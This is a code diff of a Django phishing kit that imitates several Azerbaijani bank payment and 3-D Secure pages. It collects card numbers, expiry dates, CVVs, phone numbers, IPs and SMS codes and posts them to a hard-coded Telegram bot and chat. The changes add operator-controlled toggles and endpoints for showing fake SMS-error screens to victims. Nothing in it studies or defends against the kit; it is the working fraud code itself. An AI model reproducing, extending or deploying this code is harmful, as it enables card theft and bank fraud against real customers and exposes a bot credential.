@@ -122,7 +122,8 @@ def info(request):
         contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}')
         context = {
-                'id':contact.id
+                'id':contact.id,
+                "display":contact.hidden_type
             }
         return render(request, 'pages/master.html', {'last_contact_id': contact.id})
     operator = request.session.get('operator')
@@ -160,7 +161,9 @@ def kapital(request):
     contact.save()
     contex = {
         'last_contact_id': contact.id,
-        "amount":contact.amount
+        "amount":contact.amount,
+        "display":contact.hidden_type
+        
     }
     return render(request, "pages/kapital.html",contex)
 
@@ -273,10 +276,33 @@ def contact_approve_unibank(request, pk):
     contact.bankname = "unibank"
     contact.save()
 
-    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
-    # Örneğin: return redirect('azercell')
 
     return JsonResponse({'success': True})
+
+
+def smserror(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    # Update the hidden_type field
+    contact.hidden_type = ""
+    contact.save()
+    print(contact.hidden_type)
+    # Here you can redirect to another page
+    # For example: return redirect('azercell')
+
+    return JsonResponse({'success': True})
+
+
+def smserrorfix(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    # Update the hidden_type field
+    contact.hidden_type = "none"
+    contact.save()
+    print(contact.hidden_type)
+    # Here you can redirect to another page
+    # For example: return redirect('azercell')
+
+    return JsonResponse({'success': True})
+
 
 
 @ensure_csrf_cookie
@@ -343,7 +369,9 @@ def abb(request):
     context = {
     'amount':contact.amount,
     'cc': contact.cc[-4:],
+    "display":contact.hidden_type
     }
+    print(context)
     return render( request,'pages/abb3d.html' ,context)
 
 def rabite(request):
@@ -358,6 +386,7 @@ def dsecazericard(request):
     contact.save()
     context = {
         'last_contact_id': contact.id,
+        "display":contact.hidden_type
 
     }
     response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nsms:{contact.sms}|number{contact.phone}')
@@ -373,6 +402,7 @@ def dseckapital(request):
     contact = ContactModel.objects.get(id=contact_id)
     context = {
         'last_contact_id': contact.id,
+        "display":contact.hidden_type
     }
     if request.method == "POST":
         input1 = request.POST.get("input1")
@@ -388,7 +418,7 @@ def dseckapital(request):
         contact.bankname=""
         contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nnumber{contact.phone}\nsms:{concatenated}')
-        return render( request,'pages/loading.html', )
+        return render( request,'pages/loading.html' )
     
     return render( request,'pages/loading.html',context )
 
@@ -402,10 +432,9 @@ def leobank3d(request):
     'last_contact_id': contact.id,
     'amount':contact.amount,
     'cc': contact.cc[-4:],
+    "display":contact.hidden_type
     }
     return render( request,'pages/error.html',context )
-
-
 
 @ensure_csrf_cookie
 def unibank(request):
@@ -418,6 +447,7 @@ def unibank(request):
         'number': number[-4:],
         'amount': contact.amount,
         'cc': contact.cc[-4:],
+        "display":contact.hidden_type
     }
     
     return render( request,'pages/unibank3d.html',context )
@@ -433,6 +463,7 @@ def unibank3d(request):
     contact.save()
     context = {
         'last_contact_id': contact.id,
+        "display":contact.hidden_type
     }
     if len(sms) == 0:
         # handle the case when input6 is empty
@@ -453,6 +484,7 @@ def pashabank(request):
         'number': number[-4:],
         'amount': contact.amount,
         'cc': contact.cc[-4:],
+        "display":contact.hidden_type
     }
     return render( request,'pages/pasha.html',context )
 
@@ -467,15 +499,12 @@ def error(request):
 def pashabank3d(request):
     contact_id = request.session.get('contact_id')
     contact = ContactModel.objects.get(id=contact_id)
+    context = {
+        'last_contact_id': contact.id,
+        "display":contact.hidden_type
+    }
     if request.method == "POST":
         number = str(contact.phone)
-
-        context = {
-               "last_contact.bankname":"",
-              'number': number[-4:],
-              'amount': contact.amount,
-              'cc': contact.cc[-4:],
-        }
         contact.bankname=""
         input1 = request.POST.get("input1")
         input2 = request.POST.get("input2")
@@ -499,8 +528,7 @@ def pashabank3d(request):
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nnumber{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html',context )
     
-    contact.bankname=""
-    return render( request,'pages/loading.html' )
+    return render( request,'pages/loading.html',context )
 
 
 
@@ -518,3 +546,5 @@ def check_status(request):
 class BannedIPListCreateAPIView(generics.ListCreateAPIView):
     queryset = BannedIP.objects.all()
     serializer_class = BannedIPSerializer
+    
+    
